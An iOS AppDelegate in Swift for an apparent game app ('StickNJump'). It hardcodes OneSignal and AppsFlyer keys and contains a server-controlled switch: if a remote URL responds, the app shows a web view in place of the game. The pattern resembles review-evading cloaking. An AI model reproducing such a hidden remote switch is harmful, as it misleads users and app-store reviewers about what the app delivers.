
import UIKit
import OneSignalFramework
import AppsFlyerLib
import Alamofire

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?


    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        window = UIWindow(frame: UIScreen.main.bounds)
        OneSignal.initialize("004fbf49-d980-473f-94ac-b5a0156848c6", withLaunchOptions: launchOptions)
        OneSignal.Notifications.requestPermission({ accepted in
           print("User accepted notifications: \(accepted)")
         }, fallbackToSettings: true)
              AppsFlyerLib.shared().appsFlyerDevKey = "zQn8kvc7FS6pQRMXMyh3WN"
              AppsFlyerLib.shared().appleAppID = "6467253227"
              
              AppsFlyerLib.shared().delegate = self
              AppsFlyerLib.shared().isDebug = true
        
        
        if (NetworkState().isInternetAvailable) {
            if alredyJ != nil {
                DispatchQueue.main.async {
                    let vc = WJUMP()
                    vc.goJ = URL(string: self.alredyJ!)
                    self.window?.rootViewController = vc
                    self.window?.makeKeyAndVisible()
                }
            } else {
                if let url = URL(string: ur) {
                    let session = URLSession.shared
                    let task = session.dataTask(with: url) { data, response, error in
                        if let httpResponse = response as? HTTPURLResponse {
                            if httpResponse.statusCode != 404 {
                                DispatchQueue.main.async {
                                    let vc = WJUMP()
                                    let appsFlyerId = AppsFlyerLib.shared().getAppsFlyerUID()
                                    if var urlComponents = URLComponents(string: self.ur) {
                                        urlComponents.queryItems = [
                                            URLQueryItem(name: "subid", value: appsFlyerId),
                                            URLQueryItem(name: "push_id", value: appsFlyerId)
                                        ]
                                        
                                        if let finalURL = urlComponents.url {
                                            vc.goJ = url
                                            self.window?.rootViewController = vc
                                            self.window?.makeKeyAndVisible()
                                        }
                                    }
                                    
                                }
                                
                            } else {
                                self.runningJump()
                            }
                        } else {
                            self.runningJump()
                        }
                    }
                    task.resume()
                } else {
                    self.runningJump()
                }
            }
            
        } else {
            runningJump()
        }
        
       
        return true
    }

    var alredyJ = UserDefaults.standard.string(forKey: "alredyJ")
    var ur = "https://kakssjd.world/StickNJump"
    
    
    func runningJump() {
        DispatchQueue.main.async {
            let storyboardMenu = UIStoryboard(name: "StartViewControllerJUMP", bundle: nil)
            let jumpG = storyboardMenu.instantiateViewController(withIdentifier: "StartViewControllerJUMP")
                let firstNavigationController = UINavigationController()
                firstNavigationController.navigationBar.isHidden = true
                firstNavigationController.pushViewController(jumpG, animated: true)
                self.window?.rootViewController = firstNavigationController
                self.window?.makeKeyAndVisible()
        }
    
    }
    
    

}

struct NetworkState {

    var isInternetAvailable:Bool
    {
        return NetworkReachabilityManager()!.isReachable
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        print("Conversion data: \(data)")
    }
    
    func onConversionDataFail(_ error: Error) {
        print("Conversion data error: \(error.localizedDescription)")
    }
}
